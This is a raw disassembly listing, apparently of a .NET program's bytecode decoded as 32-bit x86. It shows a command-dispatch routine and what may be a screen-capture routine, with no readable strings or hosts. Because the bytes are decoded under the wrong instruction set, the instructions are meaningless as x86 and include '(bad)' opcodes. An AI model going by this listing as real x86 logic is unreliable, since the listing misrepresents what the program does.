  403c23:	06                   	push   %es
  403c24:	44                   	inc    %esp
  403c25:	00 00                	add    %al,(%eax)
  403c27:	06                   	push   %es
  403c28:	73 a1                	jae    0x403bcb
  403c2a:	00 00                	add    %al,(%eax)
  403c2c:	0a 73 a2             	or     -0x5e(%ebx),%dh
  403c2f:	00 00                	add    %al,(%eax)
  403c31:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  403c37:	7e 20                	jle    0x403c59
  403c39:	00 00                	add    %al,(%eax)
  403c3b:	04 06                	add    $0x6,%al
  403c3d:	17                   	pop    %ss
  403c3e:	9a 6f bc 00 00 0a 38 	lcall  $0x380a,$0xbc6f
  403c45:	55                   	push   %ebp
  403c46:	04 00                	add    $0x0,%al
  403c48:	00 11                	add    %dl,(%ecx)
  403c4a:	13 72 5d             	adc    0x5d(%edx),%esi
  403c4d:	09 00                	or     %eax,(%eax)
  403c4f:	70 16                	jo     0x403c67
  403c51:	28 5b 00             	sub    %bl,0x0(%ebx)
  403c54:	00 0a                	add    %cl,(%edx)
  403c56:	16                   	push   %ss
  403c57:	33 20                	xor    (%eax),%esp
  403c59:	7e 20                	jle    0x403c7b
  403c5b:	00 00                	add    %al,(%eax)
  403c5d:	04 6f                	add    $0x6f,%al
  403c5f:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403c64:	0f 25                	(bad)
  403c66:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403c6c:	06                   	push   %es
  403c6d:	28 27                	sub    %ah,(%edi)
  403c6f:	00 00                	add    %al,(%eax)
  403c71:	0a de                	or     %dh,%bl
  403c73:	00 38                	add    %bh,(%eax)
  403c75:	25 04 00 00 11       	and    $0x11000004,%eax
  403c7a:	13 72 73             	adc    0x73(%edx),%esi
  403c7d:	09 00                	or     %eax,(%eax)
  403c7f:	70 16                	jo     0x403c97
  403c81:	28 5b 00             	sub    %bl,0x0(%ebx)
  403c84:	00 0a                	add    %cl,(%edx)
  403c86:	16                   	push   %ss
  403c87:	33 1e                	xor    (%esi),%ebx
  403c89:	72 73                	jb     0x403cfe
  403c8b:	09 00                	or     %eax,(%eax)
  403c8d:	70 7e                	jo     0x403d0d
  403c8f:	0a 00                	or     (%eax),%al
  403c91:	00 04 28             	add    %al,(%eax,%ebp,1)
  403c94:	72 00                	jb     0x403c96
  403c96:	00 06                	add    %al,(%esi)
  403c98:	28 28                	sub    %ch,(%eax)
  403c9a:	00 00                	add    %al,(%eax)
  403c9c:	0a 28                	or     (%eax),%ch
  403c9e:	2f                   	das
  403c9f:	00 00                	add    %al,(%eax)
  403ca1:	06                   	push   %es
  403ca2:	38 f7                	cmp    %dh,%bh
  403ca4:	03 00                	add    (%eax),%eax
  403ca6:	00 11                	add    %dl,(%ecx)
  403ca8:	13 72 7f             	adc    0x7f(%edx),%esi
  403cab:	09 00                	or     %eax,(%eax)
  403cad:	70 16                	jo     0x403cc5
  403caf:	28 5b 00             	sub    %bl,0x0(%ebx)
  403cb2:	00 0a                	add    %cl,(%edx)
  403cb4:	16                   	push   %ss
  403cb5:	33 6a 1f             	xor    0x1f(%edx),%ebp
  403cb8:	25 28 3e 00 00       	and    $0x3e28,%eax
  403cbd:	0a 72 8b             	or     -0x75(%edx),%dh
  403cc0:	09 00                	or     %eax,(%eax)
  403cc2:	70 28                	jo     0x403cec
  403cc4:	1f                   	pop    %ds
  403cc5:	00 00                	add    %al,(%eax)
  403cc7:	0a 13                	or     (%ebx),%dl
  403cc9:	07                   	pop    %es
  403cca:	1d 8d 26 00 00       	sbb    $0x268d,%eax
  403ccf:	01 13                	add    %edx,(%ebx)
  403cd1:	14 11                	adc    $0x11,%al
  403cd3:	14 16                	adc    $0x16,%al
  403cd5:	72 7f                	jb     0x403d56
  403cd7:	09 00                	or     %eax,(%eax)
  403cd9:	70 a2                	jo     0x403c7d
  403cdb:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403cde:	7e 0a                	jle    0x403cea
  403ce0:	00 00                	add    %al,(%eax)
  403ce2:	04 a2                	add    $0xa2,%al
  403ce4:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403ce7:	28 72 00             	sub    %dh,0x0(%edx)
  403cea:	00 06                	add    %al,(%esi)
  403cec:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403cf1:	0a 00                	or     (%eax),%al
  403cf3:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403cf6:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403cf9:	11 07                	adc    %eax,(%edi)
  403cfb:	a2 11 14 1b 7e       	mov    %al,0x7e1b1411
  403d00:	0a 00                	or     (%eax),%al
  403d02:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403d05:	11 14 1c             	adc    %edx,(%esp,%ebx,1)
  403d08:	11 07                	adc    %eax,(%edi)
  403d0a:	28 bd 00 00 0a a2    	sub    %bh,-0x5df60000(%ebp)
  403d10:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403d13:	36 00 00             	add    %al,%ss:(%eax)
  403d16:	0a 28                	or     (%eax),%ch
  403d18:	2f                   	das
  403d19:	00 00                	add    %al,(%eax)
  403d1b:	06                   	push   %es
  403d1c:	38 7d 03             	cmp    %bh,0x3(%ebp)
  403d1f:	00 00                	add    %al,(%eax)
  403d21:	11 13                	adc    %edx,(%ebx)
  403d23:	72 b1                	jb     0x403cd6
  403d25:	09 00                	or     %eax,(%eax)
  403d27:	70 16                	jo     0x403d3f
  403d29:	28 5b 00             	sub    %bl,0x0(%ebx)
  403d2c:	00 0a                	add    %cl,(%edx)
  403d2e:	16                   	push   %ss
  403d2f:	40                   	inc    %eax
  403d30:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d31:	00 00                	add    %al,(%eax)
  403d33:	00 06                	add    %al,(%esi)
  403d35:	17                   	pop    %ss
  403d36:	9a 06 18 9a 28 be 00 	lcall  $0xbe,$0x289a1806
  403d3d:	00 0a                	add    %cl,(%edx)
  403d3f:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  403d45:	13 14 11             	adc    (%ecx,%edx,1),%edx
  403d48:	14 16                	adc    $0x16,%al
  403d4a:	72 bf                	jb     0x403d0b
  403d4c:	09 00                	or     %eax,(%eax)
  403d4e:	70 a2                	jo     0x403cf2
  403d50:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403d53:	7e 0a                	jle    0x403d5f
  403d55:	00 00                	add    %al,(%eax)
  403d57:	04 a2                	add    $0xa2,%al
  403d59:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403d5c:	28 72 00             	sub    %dh,0x0(%edx)
  403d5f:	00 06                	add    %al,(%esi)
  403d61:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403d66:	0a 00                	or     (%eax),%al
  403d68:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403d6b:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403d6e:	72 d1                	jb     0x403d41
  403d70:	09 00                	or     %eax,(%eax)
  403d72:	70 a2                	jo     0x403d16
  403d74:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403d77:	36 00 00             	add    %al,%ss:(%eax)
  403d7a:	0a 28                	or     (%eax),%ch
  403d7c:	2f                   	das
  403d7d:	00 00                	add    %al,(%eax)
  403d7f:	06                   	push   %es
  403d80:	de 52 25             	ficoms 0x25(%edx)
  403d83:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403d89:	08 1b                	or     %bl,(%ebx)
  403d8b:	8d 26                	lea    (%esi),%esp
  403d8d:	00 00                	add    %al,(%eax)
  403d8f:	01 13                	add    %edx,(%ebx)
  403d91:	14 11                	adc    $0x11,%al
  403d93:	14 16                	adc    $0x16,%al
  403d95:	72 ff                	jb     0x403d96
  403d97:	09 00                	or     %eax,(%eax)
  403d99:	70 a2                	jo     0x403d3d
  403d9b:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403d9e:	7e 0a                	jle    0x403daa
  403da0:	00 00                	add    %al,(%eax)
  403da2:	04 a2                	add    $0xa2,%al
  403da4:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403da7:	28 72 00             	sub    %dh,0x0(%edx)
  403daa:	00 06                	add    %al,(%esi)
  403dac:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403db1:	0a 00                	or     (%eax),%al
  403db3:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403db6:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403db9:	11 08                	adc    %ecx,(%eax)
  403dbb:	6f                   	outsl  %ds:(%esi),(%dx)
  403dbc:	bf 00 00 0a a2       	mov    $0xa20a0000,%edi
  403dc1:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403dc4:	36 00 00             	add    %al,%ss:(%eax)
  403dc7:	0a 28                	or     (%eax),%ch
  403dc9:	2f                   	das
  403dca:	00 00                	add    %al,(%eax)
  403dcc:	06                   	push   %es
  403dcd:	28 27                	sub    %ah,(%edi)
  403dcf:	00 00                	add    %al,(%eax)
  403dd1:	0a de                	or     %dh,%bl
  403dd3:	00 38                	add    %bh,(%eax)
  403dd5:	c5 02                	lds    (%edx),%eax
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	11 13                	adc    %edx,(%ebx)
  403ddb:	72 11                	jb     0x403dee
  403ddd:	0a 00                	or     (%eax),%al
  403ddf:	70 16                	jo     0x403df7
  403de1:	28 5b 00             	sub    %bl,0x0(%ebx)
  403de4:	00 0a                	add    %cl,(%edx)
  403de6:	16                   	push   %ss
  403de7:	33 0f                	xor    (%edi),%ecx
  403de9:	72 11                	jb     0x403dfc
  403deb:	0a 00                	or     (%eax),%al
  403ded:	70 28                	jo     0x403e17
  403def:	2f                   	das
  403df0:	00 00                	add    %al,(%eax)
  403df2:	06                   	push   %es
  403df3:	38 a6 02 00 00 11    	cmp    %ah,0x11000002(%esi)
  403df9:	13 72 1b             	adc    0x1b(%edx),%esi
  403dfc:	0a 00                	or     (%eax),%al
  403dfe:	70 16                	jo     0x403e16
  403e00:	28 5b 00             	sub    %bl,0x0(%ebx)
  403e03:	00 0a                	add    %cl,(%edx)
  403e05:	16                   	push   %ss
  403e06:	33 40 06             	xor    0x6(%eax),%eax
  403e09:	80 1d 00 00 04 06 17 	sbbb   $0x17,0x6040000
  403e10:	9a 28 75 00 00 06 2d 	lcall  $0x2d06,$0x7528
  403e17:	19 72 29             	sbb    %esi,0x29(%edx)
  403e1a:	0a 00                	or     (%eax),%al
  403e1c:	70 7e                	jo     0x403e9c
  403e1e:	0a 00                	or     (%eax),%al
  403e20:	00 04 06             	add    %al,(%esi,%eax,1)
  403e23:	17                   	pop    %ss
  403e24:	9a 28 28 00 00 0a 28 	lcall  $0x280a,$0x2828
  403e2b:	2f                   	das
  403e2c:	00 00                	add    %al,(%eax)
  403e2e:	06                   	push   %es
  403e2f:	2b 12                	sub    (%edx),%edx
  403e31:	06                   	push   %es
  403e32:	17                   	pop    %ss
  403e33:	9a 28 75 00 00 06 28 	lcall  $0x2806,$0x7528
  403e3a:	76 00                	jbe    0x403e3c
  403e3c:	00 06                	add    %al,(%esi)
  403e3e:	28 38                	sub    %bh,(%eax)
  403e40:	00 00                	add    %al,(%eax)
  403e42:	06                   	push   %es
  403e43:	38 56 02             	cmp    %dl,0x2(%esi)
  403e46:	00 00                	add    %al,(%eax)
  403e48:	11 13                	adc    %edx,(%ebx)
  403e4a:	72 3f                	jb     0x403e8b
  403e4c:	0a 00                	or     (%eax),%al
  403e4e:	70 16                	jo     0x403e66
  403e50:	28 5b 00             	sub    %bl,0x0(%ebx)
  403e53:	00 0a                	add    %cl,(%edx)
  403e55:	16                   	push   %ss
  403e56:	33 26                	xor    (%esi),%esp
  403e58:	06                   	push   %es
  403e59:	18 9a 28 b2 00 00    	sbb    %bl,0xb228(%edx)
  403e5f:	0a 13                	or     (%ebx),%dl
  403e61:	09 06                	or     %eax,(%esi)
  403e63:	17                   	pop    %ss
  403e64:	9a 11 09 28 74 00 00 	lcall  $0x0,$0x74280911
  403e6b:	06                   	push   %es
  403e6c:	26 11 09             	adc    %ecx,%es:(%ecx)
  403e6f:	28 76 00             	sub    %dh,0x0(%esi)
  403e72:	00 06                	add    %al,(%esi)
  403e74:	28 38                	sub    %bh,(%eax)
  403e76:	00 00                	add    %al,(%eax)
  403e78:	06                   	push   %es
  403e79:	38 20                	cmp    %ah,(%eax)
  403e7b:	02 00                	add    (%eax),%al
  403e7d:	00 11                	add    %dl,(%ecx)
  403e7f:	13 72 55             	adc    0x55(%edx),%esi
  403e82:	0a 00                	or     (%eax),%al
  403e84:	70 16                	jo     0x403e9c
  403e86:	28 5b 00             	sub    %bl,0x0(%ebx)
  403e89:	00 0a                	add    %cl,(%edx)
  403e8b:	16                   	push   %ss
  403e8c:	33 28                	xor    (%eax),%ebp
  403e8e:	28 04 00             	sub    %al,(%eax,%eax,1)
  403e91:	00 06                	add    %al,(%esi)
  403e93:	6f                   	outsl  %ds:(%esi),(%dx)
  403e94:	3a 00                	cmp    (%eax),%al
  403e96:	00 0a                	add    %cl,(%edx)
  403e98:	6f                   	outsl  %ds:(%esi),(%dx)
  403e99:	3b 00                	cmp    (%eax),%eax
  403e9b:	00 0a                	add    %cl,(%edx)
  403e9d:	7e 2c                	jle    0x403ecb
  403e9f:	00 00                	add    %al,(%eax)
  403ea1:	04 6f                	add    $0x6f,%al
  403ea3:	c0 00 00             	rolb   $0x0,(%eax)
  403ea6:	0a 72 71             	or     0x71(%edx),%dh
  403ea9:	0a 00                	or     (%eax),%al
  403eab:	70 28                	jo     0x403ed5
  403ead:	39 00                	cmp    %eax,(%eax)
  403eaf:	00 06                	add    %al,(%esi)
  403eb1:	38 e8                	cmp    %ch,%al
  403eb3:	01 00                	add    %eax,(%eax)
  403eb5:	00 11                	add    %dl,(%ecx)
  403eb7:	13 72 93             	adc    -0x6d(%edx),%esi
  403eba:	0a 00                	or     (%eax),%al
  403ebc:	70 16                	jo     0x403ed4
  403ebe:	28 5b 00             	sub    %bl,0x0(%ebx)
  403ec1:	00 0a                	add    %cl,(%edx)
  403ec3:	16                   	push   %ss
  403ec4:	33 4b 1b             	xor    0x1b(%ebx),%ecx
  403ec7:	8d 26                	lea    (%esi),%esp
  403ec9:	00 00                	add    %al,(%eax)
  403ecb:	01 13                	add    %edx,(%ebx)
  403ecd:	14 11                	adc    $0x11,%al
  403ecf:	14 16                	adc    $0x16,%al
  403ed1:	72 93                	jb     0x403e66
  403ed3:	0a 00                	or     (%eax),%al
  403ed5:	70 a2                	jo     0x403e79
  403ed7:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403eda:	7e 0a                	jle    0x403ee6
  403edc:	00 00                	add    %al,(%eax)
  403ede:	04 a2                	add    $0xa2,%al
  403ee0:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403ee3:	28 72 00             	sub    %dh,0x0(%edx)
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403eed:	0a 00                	or     (%eax),%al
  403eef:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403ef2:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403ef5:	7e 11                	jle    0x403f08
  403ef7:	00 00                	add    %al,(%eax)
  403ef9:	04 28                	add    $0x28,%al
  403efb:	bd 00 00 0a a2       	mov    $0xa20a0000,%ebp
  403f00:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403f03:	36 00 00             	add    %al,%ss:(%eax)
  403f06:	0a 28                	or     (%eax),%ch
  403f08:	2f                   	das
  403f09:	00 00                	add    %al,(%eax)
  403f0b:	06                   	push   %es
  403f0c:	38 8d 01 00 00 11    	cmp    %cl,0x11000001(%ebp)
  403f12:	13 72 a9             	adc    -0x57(%edx),%esi
  403f15:	0a 00                	or     (%eax),%al
  403f17:	70 16                	jo     0x403f2f
  403f19:	28 5b 00             	sub    %bl,0x0(%ebx)
  403f1c:	00 0a                	add    %cl,(%edx)
  403f1e:	16                   	push   %ss
  403f1f:	40                   	inc    %eax
  403f20:	7a 01                	jp     0x403f23
  403f22:	00 00                	add    %al,(%eax)
  403f24:	7e 28                	jle    0x403f4e
  403f26:	00 00                	add    %al,(%eax)
  403f28:	04 2d                	add    $0x2d,%al
  403f2a:	0d 18 28 65 00       	or     $0x652818,%eax
  403f2f:	00 06                	add    %al,(%esi)
  403f31:	26 17                	es pop %ss
  403f33:	80 28 00             	subb   $0x0,(%eax)
  403f36:	00 04 de             	add    %al,(%esi,%ebx,8)
  403f39:	0c 28                	or     $0x28,%al
  403f3b:	25 00 00 0a 28       	and    $0x280a0000,%eax
  403f40:	27                   	daa
  403f41:	00 00                	add    %al,(%eax)
  403f43:	0a de                	or     %dh,%bl
  403f45:	00 28                	add    %ch,(%eax)
  403f47:	c1 00 00             	roll   $0x0,(%eax)
  403f4a:	0a 6f c2             	or     -0x3e(%edi),%ch
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	0a 13                	or     (%ebx),%dl
  403f51:	0c 28                	or     $0x28,%al
  403f53:	c1 00 00             	roll   $0x0,(%eax)
  403f56:	0a 6f c2             	or     -0x3e(%edi),%ch
  403f59:	00 00                	add    %al,(%eax)
  403f5b:	0a 13                	or     (%ebx),%dl
  403f5d:	18 12                	sbb    %dl,(%edx)
  403f5f:	18 28                	sbb    %ch,(%eax)
  403f61:	c3                   	ret
  403f62:	00 00                	add    %al,(%eax)
  403f64:	0a 12                	or     (%edx),%dl
  403f66:	0c 28                	or     $0x28,%al
  403f68:	c4 00                	les    (%eax),%eax
  403f6a:	00 0a                	add    %cl,(%edx)
  403f6c:	20 05 10 02 00 73    	and    %al,0x73000210
  403f72:	c5 00                	lds    (%eax),%eax
  403f74:	00 0a                	add    %cl,(%edx)
  403f76:	13 0e                	adc    (%esi),%ecx
  403f78:	11 0e                	adc    %ecx,(%esi)
  403f7a:	28 c6                	sub    %al,%dh
  403f7c:	00 00                	add    %al,(%eax)
  403f7e:	0a 13                	or     (%ebx),%dl
  403f80:	0a 12                	or     (%edx),%dl
  403f82:	0b 11                	or     (%ecx),%edx
  403f84:	0e                   	push   %cs
  403f85:	6f                   	outsl  %ds:(%esi),(%dx)
  403f86:	c7 00 00 0a 11 0e    	movl   $0xe110a00,(%eax)
  403f8c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f8d:	c8 00 00 0a          	enter  $0x0,$0xa
  403f91:	28 c9                	sub    %cl,%cl
  403f93:	00 00                	add    %al,(%eax)
  403f95:	0a 11                	or     (%ecx),%dl
  403f97:	0a 16                	or     (%esi),%dl
  403f99:	16                   	push   %ss
  403f9a:	16                   	push   %ss
  403f9b:	16                   	push   %ss
  403f9c:	11 0b                	adc    %ecx,(%ebx)
  403f9e:	20 20                	and    %ah,(%eax)
  403fa0:	00 cc                	add    %cl,%ah
  403fa2:	00 6f ca             	add    %ch,-0x36(%edi)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	0a 73 6c             	or     0x6c(%ebx),%dh
  403faa:	00 00                	add    %al,(%eax)
  403fac:	0a 13                	or     (%ebx),%dl
  403fae:	0f 20 00             	mov    %cr0,%eax
  403fb1:	01 00                	add    %eax,(%eax)
  403fb3:	00 20                	add    %ah,(%eax)
  403fb5:	9c                   	pushf
  403fb6:	00 00                	add    %al,(%eax)
  403fb8:	00 73 cb             	add    %dh,-0x35(%ebx)
  403fbb:	00 00                	add    %al,(%eax)
  403fbd:	0a 13                	or     (%ebx),%dl
  403fbf:	10 11                	adc    %dl,(%ecx)
  403fc1:	10 28                	adc    %ch,(%eax)
  403fc3:	c6 00 00             	movb   $0x0,(%eax)
  403fc6:	0a 13                	or     (%ebx),%dl
  403fc8:	0d 11 0d 11 0e       	or     $0xe110d11,%eax
  403fcd:	12 18                	adc    (%eax),%bl
  403fcf:	16                   	push   %ss
  403fd0:	16                   	push   %ss
  403fd1:	20 00                	and    %al,(%eax)
  403fd3:	01 00                	add    %eax,(%eax)
  403fd5:	00 20                	add    %ah,(%eax)
  403fd7:	9c                   	pushf
  403fd8:	00 00                	add    %al,(%eax)
  403fda:	00 28                	add    %ch,(%eax)
  403fdc:	cc                   	int3
  403fdd:	00 00                	add    %al,(%eax)
  403fdf:	0a 11                	or     (%ecx),%dl
  403fe1:	18 12                	sbb    %dl,(%edx)
  403fe3:	17                   	pop    %ss
  403fe4:	16                   	push   %ss
  403fe5:	16                   	push   %ss
  403fe6:	11 0e                	adc    %ecx,(%esi)
  403fe8:	6f                   	outsl  %ds:(%esi),(%dx)
  403fe9:	c7 00 00 0a 11 0e    	movl   $0xe110a00,(%eax)
  403fef:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff0:	c8 00 00 0a          	enter  $0x0,$0xa
  403ff4:	28 cc                	sub    %cl,%ah
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	0a 11                	or     (%ecx),%dl
  403ffa:	17                   	pop    %ss
  403ffb:	18 6f cd             	sbb    %ch,-0x33(%edi)
  403ffe:	00 00                	add    %al,(%eax)
  404000:	0a 11                	or     (%ecx),%dl
  404002:	10 11                	adc    %dl,(%ecx)
  404004:	0f 28 ce             	movaps %xmm6,%xmm1
  404007:	00 00                	add    %al,(%eax)
  404009:	0a 6f cf             	or     -0x31(%edi),%ch
  40400c:	00 00                	add    %al,(%eax)
  40400e:	0a 1b                	or     (%ebx),%bl
  404010:	8d 26                	lea    (%esi),%esp
  404012:	00 00                	add    %al,(%eax)
  404014:	01 13                	add    %edx,(%ebx)
  404016:	14 11                	adc    $0x11,%al
  404018:	14 16                	adc    $0x16,%al
  40401a:	72 b3                	jb     0x403fcf
  40401c:	0a 00                	or     (%eax),%al
  40401e:	70 a2                	jo     0x403fc2
  404020:	11 14 17             	adc    %edx,(%edi,%edx,1)
  404023:	7e 0a                	jle    0x40402f
  404025:	00 00                	add    %al,(%eax)
  404027:	04 a2                	add    $0xa2,%al
  404029:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  40402c:	28 72 00             	sub    %dh,0x0(%edx)
  40402f:	00 06                	add    %al,(%esi)
  404031:	a2 11 14 19 7e       	mov    %al,0x7e191411
  404036:	0a 00                	or     (%eax),%al
  404038:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40403b:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  40403e:	11 0f                	adc    %ecx,(%edi)
  404040:	6f                   	outsl  %ds:(%esi),(%dx)
  404041:	9b                   	fwait
  404042:	00 00                	add    %al,(%eax)
  404044:	0a 28                	or     (%eax),%ch
  404046:	77 00                	ja     0x404048
  404048:	00 06                	add    %al,(%esi)
  40404a:	28 d0                	sub    %dl,%al
  40404c:	00 00                	add    %al,(%eax)
  40404e:	0a a2 11 14 28 36    	or     0x36281411(%edx),%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a 28                	or     (%eax),%ch
  404058:	2f                   	das
  404059:	00 00                	add    %al,(%eax)
  40405b:	06                   	push   %es
  40405c:	11 0a                	adc    %ecx,(%edx)
  40405e:	6f                   	outsl  %ds:(%esi),(%dx)
  40405f:	d1 00                	roll   $1,(%eax)
  404061:	00 0a                	add    %cl,(%edx)
  404063:	11 0f                	adc    %ecx,(%edi)
  404065:	6f                   	outsl  %ds:(%esi),(%dx)
  404066:	9d                   	popf
  404067:	00 00                	add    %al,(%eax)
  404069:	0a 11                	or     (%ecx),%dl
  40406b:	10 6f d2             	adc    %ch,-0x2e(%edi)
  40406e:	00 00                	add    %al,(%eax)
  404070:	0a 11                	or     (%ecx),%dl
  404072:	0d 6f d1 00 00       	or     $0xd16f,%eax
  404077:	0a 11                	or     (%ecx),%dl
  404079:	0e                   	push   %cs
  40407a:	6f                   	outsl  %ds:(%esi),(%dx)
  40407b:	d2 00                	rolb   %cl,(%eax)
  40407d:	00 0a                	add    %cl,(%edx)
  40407f:	de 0c 28             	fimuls (%eax,%ebp,1)
  404082:	25 00 00 0a 28       	and    $0x280a0000,%eax
  404087:	27                   	daa
  404088:	00 00                	add    %al,(%eax)
  40408a:	0a de                	or     %dh,%bl
  40408c:	00 de                	add    %bl,%dh
  40408e:	0f 25                	(bad)
  404090:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  404096:	11 28                	adc    %ebp,(%eax)
  404098:	27                   	daa
  404099:	00 00                	add    %al,(%eax)
  40409b:	0a de                	or     %dh,%bl
  40409d:	00 de                	add    %bl,%dh
  40409f:	1b 25 28 25 00 00    	sbb    0x2528,%esp
  4040a5:	0a 13                	or     (%ebx),%dl
  4040a7:	12 11                	adc    (%ecx),%dl
  4040a9:	12 6f bf             	adc    -0x41(%edi),%ch
  4040ac:	00 00                	add    %al,(%eax)
  4040ae:	0a 28                	or     (%eax),%ch
  4040b0:	3a 00                	cmp    (%eax),%al
  4040b2:	00 06                	add    %al,(%esi)
  4040b4:	28 27                	sub    %ah,(%edi)
  4040b6:	00 00                	add    %al,(%eax)
  4040b8:	0a de                	or     %dh,%bl
  4040ba:	00 2a                	add    %ch,(%edx)
  4040bc:	41                   	inc    %ecx
  4040bd:	f4                   	hlt
  4040be:	00 00                	add    %al,(%eax)
  4040c0:	00 00                	add    %al,(%eax)
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	65 01 00             	add    %eax,%gs:(%eax)
  4040c7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	81 01 00 00 0c 00    	addl   $0xc0000,(%ecx)
  4040d2:	00 00                	add    %al,(%eax)
  4040d4:	29 00                	sub    %eax,(%eax)
  4040d6:	00 01                	add    %al,(%ecx)
  4040d8:	00 00                	add    %al,(%eax)
  4040da:	00 00                	add    %al,(%eax)
  4040dc:	98                   	cwtl
  4040dd:	02 00                	add    (%eax),%al
  4040df:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4040e2:	00 00                	add    %al,(%eax)
  4040e4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4040e5:	02 00                	add    (%eax),%al
  4040e7:	00 0e                	add    %cl,(%esi)
  4040e9:	00 00                	add    %al,(%eax)
  4040eb:	00 29                	add    %ch,(%ecx)
  4040ed:	00 00                	add    %al,(%eax)
  4040ef:	01 00                	add    %eax,(%eax)
  4040f1:	00 00                	add    %al,(%eax)
  4040f3:	00 ea                	add    %ch,%dl
  4040f5:	02 00                	add    (%eax),%al
  4040f7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4040fa:	00 00                	add    %al,(%eax)
  4040fc:	f6 02 00             	testb  $0x0,(%edx)
  4040ff:	00 0f                	add    %cl,(%edi)
  404101:	00 00                	add    %al,(%eax)
  404103:	00 29                	add    %ch,(%ecx)
  404105:	00 00                	add    %al,(%eax)
  404107:	01 00                	add    %eax,(%eax)
  404109:	00 00                	add    %al,(%eax)
  40410b:	00 1a                	add    %bl,(%edx)
  40410d:	03 00                	add    (%eax),%eax
  40410f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404112:	00 00                	add    %al,(%eax)
  404114:	26 03 00             	add    %es:(%eax),%eax
  404117:	00 0f                	add    %cl,(%edi)
  404119:	00 00                	add    %al,(%eax)
  40411b:	00 29                	add    %ch,(%ecx)
  40411d:	00 00                	add    %al,(%eax)
  40411f:	01 00                	add    %eax,(%eax)
  404121:	00 00                	add    %al,(%eax)
  404123:	00 6d 03             	add    %ch,0x3(%ebp)
  404126:	00 00                	add    %al,(%eax)
  404128:	0c 00                	or     $0x0,%al
  40412a:	00 00                	add    %al,(%eax)
  40412c:	79 03                	jns    0x404131
  40412e:	00 00                	add    %al,(%eax)
  404130:	0f 00 00             	sldt   (%eax)
  404133:	00 29                	add    %ch,(%ecx)
  404135:	00 00                	add    %al,(%eax)
  404137:	01 00                	add    %eax,(%eax)
  404139:	00 00                	add    %al,(%eax)
  40413b:	00 48 04             	add    %cl,0x4(%eax)
  40413e:	00 00                	add    %al,(%eax)
  404140:	4e                   	dec    %esi
  404141:	00 00                	add    %al,(%eax)
  404143:	00 96 04 00 00 52    	add    %dl,0x52000004(%esi)
  404149:	00 00                	add    %al,(%eax)
  40414b:	00 29                	add    %ch,(%ecx)
  40414d:	00 00                	add    %al,(%eax)
  40414f:	01 00                	add    %eax,(%eax)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 38                	add    %bh,(%eax)
  404155:	06                   	push   %es
  404156:	00 00                	add    %al,(%eax)
  404158:	16                   	push   %ss
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 4e 06             	add    %cl,0x6(%esi)
  40415e:	00 00                	add    %al,(%eax)
  404160:	0c 00                	or     $0x0,%al
  404162:	00 00                	add    %al,(%eax)
  404164:	29 00                	sub    %eax,(%eax)
  404166:	00 01                	add    %al,(%ecx)
  404168:	00 00                	add    %al,(%eax)
  40416a:	00 00                	add    %al,(%eax)
  40416c:	70 07                	jo     0x404175
  40416e:	00 00                	add    %al,(%eax)
  404170:	25 00 00 00 95       	and    $0x95000000,%eax
  404175:	07                   	pop    %es
  404176:	00 00                	add    %al,(%eax)
  404178:	0c 00                	or     $0x0,%al
  40417a:	00 00                	add    %al,(%eax)
  40417c:	29 00                	sub    %eax,(%eax)
  40417e:	00 01                	add    %al,(%ecx)
  404180:	00 00                	add    %al,(%eax)
  404182:	00 00                	add    %al,(%eax)
  404184:	38 06                	cmp    %al,(%esi)
  404186:	00 00                	add    %al,(%eax)
  404188:	6b 01 00             	imul   $0x0,(%ecx),%eax
  40418b:	00 a3 07 00 00 0f    	add    %ah,0xf000007(%ebx)
  404191:	00 00                	add    %al,(%eax)
  404193:	00 29                	add    %ch,(%ecx)
  404195:	00 00                	add    %al,(%eax)
  404197:	01 00                	add    %eax,(%eax)
  404199:	00 00                	add    %al,(%eax)
  40419b:	00 00                	add    %al,(%eax)
  40419d:	00 00                	add    %al,(%eax)
